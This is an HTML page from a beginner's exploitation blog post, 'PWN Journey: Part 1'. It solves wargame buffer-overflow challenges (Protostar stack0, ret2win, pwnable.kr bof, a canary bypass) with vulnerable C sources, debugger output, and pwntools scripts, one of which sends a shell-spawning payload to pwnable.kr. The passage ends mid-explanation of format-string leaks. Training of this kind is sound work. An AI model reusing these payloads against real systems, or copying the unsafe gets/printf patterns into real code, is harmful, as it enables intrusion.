@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.">  
+
+  <title>
+    
+      PWN Journey: Part 1
+    
+  </title>
+
+  
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon/green.png" />
+
+  
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.f3fa33b7405523e26c3513ae28d727c60efcaaa6c532b418812d08f71cb380419ee24a4e53a155d97b0879f61144b0476768c589c47485ffa080cbc5a4cd85f2.css" integrity="sha512-8/ozt0BVI&#43;JsNROuKNcnxg78qqbFMrQYgS0I9xyzgEGe4kpOU6FV2XsIefYRRLBHZ2jFicR0hf&#43;ggMvFpM2F8g==" />
+  
+
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/jquery_3.7.1.min.js"></script>
+  
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/typing_effect.min.js"></script>
+
+  
+  
+  <script defer type="text/javascript" src="//localhost:1313/js/img_relocs.min.js"></script>
+</head>
+<body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a style="color: #ff5;" href="/">[HOME]</a>
+
+<article>
+    <p class="post-meta">
+        
+        <time datetime="2021-12-29 09:30:00 &#43;1345 &#43;1345">
+            2021-12-29
+        </time>
+    </p>
+
+    <h1>PWN Journey: Part 1</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#foreword">Foreword</a></li>
+    <li><a href="#protostar-stack0-reproduced">Protostar stack0 (reproduced)</a>
+      <ul>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#solvepy">Solve.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#ret2win-reproduce">ret2win (reproduce)</a>
+      <ul>
+        <li><a href="#code-breakdown">Code breakdown</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+        <li><a href="#solvepy-1">Solve.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwnablekr---bof">Pwnable.kr - bof</a>
+      <ul>
+        <li><a href="#code-breakdown-1">Code breakdown</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+        <li><a href="#solvepy-2">Solve.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#canary-custom">Canary (custom)</a>
+      <ul>
+        <li><a href="#code-breakdown-2">Code breakdown</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+        <li><a href="#solvepy-3">Solve.py</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <h2 id="foreword"><a class="h-anchor" href="#foreword">Foreword</a></h2>
+<p>Greetings, this series of posts delves into a collection of <em>pwnie</em> solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.</p>
+<p>Notwithstanding these step-by-step solutions, I still strongly encourage readers to reproduce or alter the challenges in their own way. Moreover, please do keep in mind that the solutions are not being put in any level orders, even the first ones can be much complicated for you to fully digest. With that said, then scratching your head for hours, diving into the basics and bending them to your needs is a minimum requirement to achieve your goal.</p>
+<p>Anyway, I hope you have a good time learning.</p>
+<h2 id="protostar-stack0-reproduced"><a class="h-anchor" href="#protostar-stack0-reproduced">Protostar stack0 (reproduced)</a></h2>
+<p><strong>Goal:</strong> Change the value of <code>modified</code> to any but 0.</p>
+<p>The <em>original challenge</em> can be found <a href="https://exploit.education/protostar/stack-zero/">here</a>. You should practice this challenge using Protostar VM first since it is built as a 32-bit ELF, much simpler and straightforward.</p>
+<p>This particular version of stack0, however, is expected to be built and executed on a variety of different architectures, customizations, and such others.</p>
+<p>Description:</p>
+<pre tabindex="0"><code>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
+</code></pre><p>Source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// NOTE: I don&#39;t use the VM provided by Protostar. So I will include my build options within the source.
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// Build: $ gcc -g stack0.c -o stack0 -no-pie -fno-stack-protector -z execstack
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>(<span style="color:#ee82ee">int</span> argc, <span style="color:#ee82ee">char</span> **argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f00">volatile</span> <span style="color:#ee82ee">int</span> modified;	<span style="color:#0f0">// volatile keyword ensures that this variable is not optimized (deleted) by compilers as it is not being used or modified at all
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>  <span style="color:#ee82ee">char</span> buffer[<span style="color:#f60">64</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  modified = <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff0">gets</span>(buffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f00">if</span>(modified != <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;you have changed the &#39;modified&#39; variable</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#f00">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Try again?</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>You can achieve the goal by triggering a buffer overflow in the <code>gets</code> function since it got flagged unsafe, according to MSDN:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-08_11-02.png"></p>
+<h3 id="solution"><a class="h-anchor" href="#solution">Solution</a></h3>
+<p>Some of you have thought of inserting 64 random characters into the <code>buffer</code> variable and a random byte to write pass the <code>modified</code> variable itself then congratulation, you are correct&hellip; theoretically. If you are exercising the challenge connecting to Protostar VM, it should work properly; otherwise, you might encounter as follows:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-08_11-55.png"></p>
+<p>This happened mostly due to our stack alignment or compiler options being somewhat different from that of Protostar VM.</p>
+<p>Let us have a closer analysis at the assembly code.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_09-01.png"></p>
+<p>Put your focus around these lines:</p>
+<pre tabindex="0"><code>[0x7ffff7fd3050]&gt; s main;pdf
+            ; DATA XREF from entry0 @ 0x55555555507d
+┌ 79: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_50h @ rbp-0x50
+│           ; var int64_t var_4h @ rbp-0x4
+...
+│           0x555555555154      c745fc000000.  mov dword [var_4h], 0
+│           0x55555555515b      488d45b0       lea rax, [var_50h]
+│           0x55555555515f      4889c7         mov rdi, rax
+│           0x555555555162      b800000000     mov eax, 0
+│           0x555555555167      e8d4feffff     call sym.imp.gets       ; char *gets(char *s)
+│           0x55555555516c      8b45fc         mov eax, dword [var_4h]
+...
+</code></pre><p>Based on the code, <code>gets</code> reads a line from STDIN and the size of the buffer can be inferred by subtracting the end address (i.e, <code>rbp-0x50</code>) with  the start address (i.e, <code>rbp-0x4</code>). Hence, <code>buf_size = 0x50 - 0x4 = 0x4c = 76 (decimal)</code>.</p>
+<h3 id="solvepy"><a class="h-anchor" href="#solvepy">Solve.py</a></h3>
+<p>And from that we now know how many characters are needed to overflow the buffer, but remember we still have to overwrite the <code>modified</code> variable.</p>
+<p>So here is our one-liner.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -c <span style="color:#87ceeb">&#39;print(b&#34;a&#34;*76 + b&#34;modified_val&#34;)&#39;</span> | ./stack0
+</span></span></code></pre></div><p>Goal achieved.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_09-30.png"></p>
+<hr>
+<h2 id="ret2win-reproduce"><a class="h-anchor" href="#ret2win-reproduce">ret2win (reproduce)</a></h2>
+<p><strong>Goal:</strong> Successfully overwrite the return pointer to execute <code>win()</code>.</p>
+<p>A random 32-bit challenge on the Internet with only its source code provided. Same approach but in 64-bit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// Build: $ gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">unsafe</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buffer[<span style="color:#f60">40</span>];
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Overflow me&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">gets</span>(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">unsafe</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">flag</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Exploited!!!!!&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="code-breakdown"><a class="h-anchor" href="#code-breakdown">Code breakdown</a></h3>
+<p>The program calls <code>unsafe()</code>, which contains a buffer overflow vulnerability at the <code>gets</code> with a buffer of 40 bytes. Furthermore, there is a <code>flag()</code> function but it is completely isolated, never to be called and we have to somehow invoke the function.</p>
+<h3 id="solution-1"><a class="h-anchor" href="#solution-1">Solution</a></h3>
+<p>As already mentioned, we need to find how many bytes to overflow and reach the return address pointer, thus 40 bytes is not enough. You can imagine our skeleton payload should roughly be as follows:</p>
+<pre tabindex="0"><code>payload = BUF_SIZE (40 bytes) + SOME_JUNK (?? bytes) + FLAG_ADDR (RIP)
+</code></pre><p>The <code>BUF_SIZE</code> and <code>SOME_JUNK</code> in combination, there is a generic term for it called <em>padding</em> and we have to determine the padding length before you can overwrite the value of <code>RIP</code>.</p>
+<p>Let me introduce you to the <strong>De Bruijn Sequence</strong>, which contains no string of <code>n</code> character repeated. The sequence can either be created by yourself or any available auxiliaries (e.g., <code>ragg2</code>, <code>cyclic</code>, <code>pattern_create (gdb)</code>).</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-11.png"></p>
+<p>The reason why a <em>random</em> gibberish string is able to help us to find the padding is that while you are filling the stack with the sequence, <code>RIP</code> (and even others) could already be overwritten, thereby leading to a SIGSEGV and crashing the execution. With that, the particular position of these so-called <em>random bytes</em> in <code>RIP</code> now is that of our padding length in the sequence pattern.</p>
+<p>Next, we want to load the binary in our debugger and find the padding length</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-40.png"></p>
+<p>and our registers table:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-50.png"></p>
+<p>The <code>wopO `dr rip` </code> command simply finds the given value in <code>RIP</code> into a De Bruijn sequence at a current offset or you can just type <code>wopO 0x41415441</code> instead and it will show us our same padding size, 56.</p>
+<pre tabindex="0"><code>payload = PADDING (56 bytes) + FLAG_ADDR (RIP)
+</code></pre><p>We have one last factor, the address of <code>flag()</code> which is <code>0x0040116b</code>. To get it, simply type <code>afl</code> for a list of functions and their addresses.</p>
+<pre tabindex="0"><code>[0x41415441]&gt; afl
+0x00401050    1 42           entry0
+0x00401090    4 33   -&gt; 31   sym.deregister_tm_clones
+0x004010c0    4 49           sym.register_tm_clones
+0x00401100    3 33   -&gt; 28   sym.__do_global_dtors_aux
+0x00401130    1 2            entry.init0
+0x004011e0    1 1            sym.__libc_csu_fini
+0x00401132    1 40           dbg.unsafe
+0x00401030    1 6            sym.imp.puts
+0x00401040    1 6            sym.imp.gets
+0x004011e4    1 9            sym._fini
+0x00401180    4 93           sym.__libc_csu_init
+0x00401080    1 1            sym._dl_relocate_static_pie
+0x0040115a    1 17           dbg.main
+0x0040116b    1 19           dbg.flag					; THIS ONE
+0x00401000    3 23           map._home_kali_Desktop_Study_PWN_etc_ret2win_vuln.r_x
+</code></pre><p>Using the built-in <code>grep</code>, radare should have the output optimized</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_12-02.png"></p>
+<h3 id="solvepy-1"><a class="h-anchor" href="#solvepy-1">Solve.py</a></h3>
+<p>Now that we have the padding length, control <code>RIP</code> and <code>flag()</code> address.</p>
+<p>Hence, our final <code>solve.py</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag_rip = p64(<span style="color:#f60">0x0040116b</span>)	<span style="color:#0f0"># pack flag_addr: \x6b\x11\x40\x00</span>
+</span></span><span style="display:flex;"><span>padding = asm(shellcraft.nop()) * <span style="color:#f60">56</span>	<span style="color:#0f0"># 56 bytes of NOP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload = padding + flag_rip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r = process(<span style="color:#87ceeb">&#39;./vuln&#39;</span>)
+</span></span><span style="display:flex;"><span>r.sendlineafter(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;me</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>print(r.clean())
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_13-22.png"></p>
+<hr>
+<h2 id="pwnablekr---bof"><a class="h-anchor" href="#pwnablekr---bof">Pwnable.kr - bof</a></h2>
+<p><strong>Goal:</strong> Successfully modify the value of <code>key</code> to spawn a shell.</p>
+<p>This is an original challenge at <a href="https://pwnable.kr/play.php">pwnable.kr</a>.</p>
+<p>Description:</p>
+<pre tabindex="0"><code>Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 9000
+</code></pre><p>Provided source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;string.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">func</span>(<span style="color:#ee82ee">int</span> key){
+</span></span><span style="display:flex;"><span>	<span style="color:#ee82ee">char</span> overflowme[<span style="color:#f60">32</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;overflow me : &#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#ff0">gets</span>(overflowme);	<span style="color:#0f0">// smash me!
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>	<span style="color:#f00">if</span>(key == <span style="color:#f60">0xcafebabe</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#ff0">system</span>(<span style="color:#87ceeb">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#f00">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Nah..</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>(<span style="color:#ee82ee">int</span> argc, <span style="color:#ee82ee">char</span>* argv[]){
+</span></span><span style="display:flex;"><span>	<span style="color:#ff0">func</span>(<span style="color:#f60">0xdeadbeef</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="code-breakdown-1"><a class="h-anchor" href="#code-breakdown-1">Code breakdown</a></h3>
+<p>There are only two function, <code>main</code> and <code>func</code>.</p>
+<p><code>main</code> basically calls <code>func</code> with <code>0xdeadbeef</code> as its sole <code>key</code> argument whose value is to be compared with <code>0xcafebabe</code> and if true, spawns a shell or, otherwise, prints <code>Nah..\n</code>. Not to mention the obvious buffer overflow as <code>func</code> creates a 32 bytes buffer then reads it with <code>gets</code>.</p>
+<h3 id="solution-2"><a class="h-anchor" href="#solution-2">Solution</a></h3>
+<p>Since we are not reproducing the challenge but downloading straight from the source, let us check its properties.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_10-14.png"></p>
+<p>Not a fan of radare2? Here is the simplified output from <a href="https://github.com/slimm609/checksec.sh">checksec</a>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_10-16.png"></p>
+<p>As it might be seen, the binary has NX, PIE, and canary bit enabled. Especially with stack canary, we are not able to determine the padding length with De Bruijn Sequence anymore. However, other protection bits are neither important nor able to interrupt our payload in this practice at all so I will skip them for now.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-17.png"></p>
+<p>Therefore, you have to evaluate these offsets manually.</p>
+<p>First, set a breakpoint after the <code>gets</code> function because the subsequent instruction is the comparison of <code>key</code> and <code>0xcafebabe</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-23.png"></p>
+<p>Then locate our buffer offset, which is <code>0xffef8ffc</code>, apparently.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-25.png"></p>
+<p>And variable <code>key</code>&rsquo;s offset, <code>0xffef9030</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-32.png"></p>
+<p>Evaluate this expression: <code>0xffef9030 - 0xffef8ffc = 0x34 = 52 (decimal) &lt;-- padding length</code>.</p>
+<p>Also, you can try using this shortcut instead of those weary steps.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>[0x5658662c]&gt;? <span style="color:#87ceeb">`</span>pxr <span style="color:#f60">1</span> @ebp+8 ~[0]<span style="color:#87ceeb">`</span> - <span style="color:#87ceeb">`</span>dr eax<span style="color:#87ceeb">`</span>
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-51.png"></p>
+<p>Hence, our skeleton payload:</p>
+<pre tabindex="0"><code>payload = PADDING (52) + KEY_VALUE
+</code></pre><h3 id="solvepy-2"><a class="h-anchor" href="#solvepy-2">Solve.py</a></h3>
+<p>Either of these should work properly.</p>
+<p>One-liner: <code>python -c&quot;print(b'a'*52+b'\xbe\xba\xfe\xca')&quot; | tee payload &amp;&amp; (cat payload &amp;&amp; cat)| nc pwnable.kr 9000</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_09-21.png"></p>
+<p>Pwntools:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;a&#39;</span>*<span style="color:#f60">52</span> + p32(<span style="color:#f60">0xcafebabe</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">if</span> __name__ == <span style="color:#87ceeb">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#f00">if</span>(sys.argv[<span style="color:#f60">1</span>] == <span style="color:#87ceeb">&#39;local&#39;</span>):
+</span></span><span style="display:flex;"><span>		r = process(<span style="color:#87ceeb">&#39;./bof&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#f00">else</span>:
+</span></span><span style="display:flex;"><span>		r = remote(<span style="color:#87ceeb">&#39;pwnable.kr&#39;</span>, <span style="color:#f60">9000</span>)
+</span></span><span style="display:flex;"><span>	r.clean()
+</span></span><span style="display:flex;"><span>	r.sendline(payload)
+</span></span><span style="display:flex;"><span>	r.interactive()
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_12-07.png"></p>
+<h2 id="canary-custom"><a class="h-anchor" href="#canary-custom">Canary (custom)</a></h2>
+<p><strong>Goal:</strong> Successfully bypass canary and call <code>win()</code>.</p>
+<p>Source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// Build: $ gcc canary.c -o canary -no-pie -fstack-protector -z execstack
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0">// The option &#34;-fstack-protector&#34; enables canary
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>
+</span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;string.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buffer[<span style="color:#f60">32</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Leak me&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">gets</span>(buffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(buffer);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;Overflow me&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">gets</span>(buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">vuln</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">win</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">puts</span>(<span style="color:#87ceeb">&#34;You won!&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This simple challenge ideally demonstrates how we can bypass stack protection, as know as stack canary.</p>
+<p>But before being able to understand the crucial part, we should get hold of the protection bit first. To put it simply, at the prologue of a function, a random value is place onto the stack and before the program execute <code>ret</code>, the present value of that variable is to be compared with the initial and a <code>***stack smashing detected***</code> error message would show up thereafter if they are not the same; otherwise, exit normally.</p>
+<p><strong>Note:</strong> <em>Stack canaries in Linux is a bit more tricky as they end in <code>00</code>, which will null-terminated any strings in case you make mistakes using print functions. Still, it makes them much easier to spot.</em></p>
+<h3 id="code-breakdown-2"><a class="h-anchor" href="#code-breakdown-2">Code breakdown</a></h3>
+<p>There are three functions: <code>main</code>, <code>vuln</code> and <code>win</code>.</p>
+<p><code>win</code> is isolated and <code>main</code> merely calls <code>vuln</code>. <code>vuln</code>, however, reads a buffer of 32 bytes twice, before and after printing it using <code>puts</code>.</p>
+<h3 id="solution-3"><a class="h-anchor" href="#solution-3">Solution</a></h3>
+<h4 id="1-brute-forcing"><a class="h-anchor" href="#1-brute-forcing">1. Brute-forcing</a></h4>
+<p>Please do remember that this method <strong>works exclusively with 32-bit programs</strong> and sometimes is the sole solution when there are no leak capabilities. Since it is, unfortunately, not practicable with our particular 64-bit binary, we will discuss the method further at another time.</p>
+<h4 id="2-leaking-a-stack-canary"><a class="h-anchor" href="#2-leaking-a-stack-canary">2. Leaking a Stack Canary</a></h4>
+<p>This method aim is to read the value of the canary through a certain <strong>format string leakages</strong>, such as <code>read</code>, <code>strncpy</code>, <code>puts</code> and <code>printf</code>.</p>
+<p>A format string bug is a simple, yet, powerful auxiliary which if you can manipulate and leverage it to perform reading or even writing to arbitrary memory regions. Imagine you have a small code snippet as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ee82ee">int</span> a = <span style="color:#f60">64</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;%x %x %x&#34;</span>, a, a, a);
+</span></span></code></pre></div><p>Expected output:</p>
+<pre tabindex="0"><code>40 40 40
